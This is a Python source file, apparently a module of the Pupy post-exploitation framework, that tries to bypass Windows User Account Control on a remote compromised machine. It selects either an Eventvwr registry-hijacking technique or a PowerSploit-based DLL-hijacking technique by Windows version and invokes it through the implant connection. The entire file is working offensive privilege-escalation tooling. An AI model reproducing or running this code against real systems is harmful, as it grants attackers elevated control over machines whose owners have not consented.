# -*- coding: UTF8 -*-
#Author: @bobsecq
#Contributor(s):

import os
from pupylib.PupyModule import *
from rpyc.utils.classic import upload
from modules.lib.windows.bypassuac import bypassuac
__class_name__="BypassUAC"

ROOT=os.path.abspath(os.path.join(os.path.dirname(__file__),"..",".."))

@config(compat="windows", category="privesc")
class BypassUAC(PupyModule):
    """try to bypass UAC """
    dependencies=["psutil", "pupwinutils.processes", "pupwinutils.security"]
    
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="bypassuac", description=self.__doc__)
        self.arg_parser.add_argument('-m', dest='method', choices=["eventvwr", "dll_hijacking"], default=None, help="Default: the technic will be choosen for you. 'dll_hijacking' for wind7-8.1 and 'eventvwr' for wind7-10.")

    def run(self, args):
        # check if a UAC Bypass can be done
        if not self.client.conn.modules["pupwinutils.security"].can_get_admin_access():
            self.error('Your are not on the local administrator group.')
            return

        dll_hijacking = False
        registry_hijacking = False

        bypassUasModule = bypassuac(self, rootPupyPath=ROOT)
        # choose methods depending on the OS Version
        if not args.method:
            if self.client.desc['release'] == '10':
                registry_hijacking = True
            else:
                dll_hijacking = True
        elif args.method == "eventvwr":     
            registry_hijacking = True
        else:
            dll_hijacking = True

        if registry_hijacking:
            self.success("Trying to bypass UAC using the Eventvwr method, wind7-10 targets...")
            bypassUasModule.bypassuac_through_EventVwrBypass()
        elif dll_hijacking:
            # Invoke-BypassUAC.ps1 uses different technics to bypass depending on the Windows Version (Sysprep for Windows 7/2008 and NTWDBLIB.dll for Windows 8/2012)
            self.success("Trying to bypass UAC using DLL Hijacking, wind7-8.1 targets...")
            bypassUasModule.bypassuac_through_PowerSploitBypassUAC()
